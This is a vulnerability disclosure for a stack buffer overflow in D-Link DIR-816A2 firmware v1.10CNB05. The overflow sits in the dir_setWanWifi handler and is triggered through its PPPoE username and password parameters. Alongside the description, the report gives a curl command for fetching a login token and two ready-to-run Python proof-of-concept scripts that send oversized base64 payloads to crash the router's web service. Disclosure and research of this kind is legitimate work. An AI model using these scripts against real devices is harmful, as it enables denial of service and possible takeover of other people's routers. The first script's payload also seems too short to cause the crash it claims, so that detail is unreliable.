

# Affected Version

Dlink DIR-816A2_FWv1.10CNB05

# Vulnerability Description

Dlink DIR-816A2_FWv1.10CNB05 was discovered to contain a stack overflow via parameter pppoe_usrname 、pppoe_psword in dir_setWanWifi.

# Firmware download address

Manufacturer's address: https://www.dlink.com/
Firmware download address: http://www.dlink.com.cn/techsupport/AllPro.aspx

# Vulnerability Details

The access path of the vulnerability is: http://ip/goform/dir_setWanWifi. The function dir_setWanWifi(int a1, const char *a2, const char *a3), has a buffer overflow when retrieving the parameters pppoe_usrname and pppoe_psword from the request packet. When the value of the parameter connecttype is "PPPOE", it retrieves the parameters pppoe_usrname and pppoe_psword from the request package, and then decodes them using websDecode64 for base64 decoding. The decoded result is stored in the decode_pppoe_usrname stack, and due to the lack of length restriction, this leads to a stack overflow.

![image-20250922171912019](dlink-816-b05.assets/image-20250922171912019.png)

By requesting this page, an attacker can easily execute denial of service attacks or remote code execution using carefully crafted overflow data.

## Vulnerability 1

通过下面的命令获取 tokenid

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

### POC

```python
import requests
import base64

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = '1804289383'

url = 'http://192.168.0.1/goform/dir_setWanWifi'

data = {
    'tokenid' : tokenid,
    'statuscheckpppoeuser' : 'a' * 8, 
    'connecttype' : 'PPPOE',
    'pppoe_usrname': base64.b64encode(('b'*0x8).encode("utf-8")),
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

运行poc可造成，goahead服务崩溃

![image-20250922171334978](C:\Users\oooooooo\AppData\Roaming\Typora\typora-user-images\image-20250922171334978.png)

### Vulnerability 2

```python
import requests
import base64

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = '1804289383'

url = 'http://192.168.0.1/goform/dir_setWanWifi'

data = {
    'tokenid' : tokenid,
    'statuscheckpppoeuser' : 'a' * 8, 
    'connecttype' : 'PPPOE',
    'pppoe_usrname': base64.b64encode(('b'*0x8).encode("utf-8")),
    'pppoe_psword': base64.b64encode(('b'*0x1000).encode("utf-8"))
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

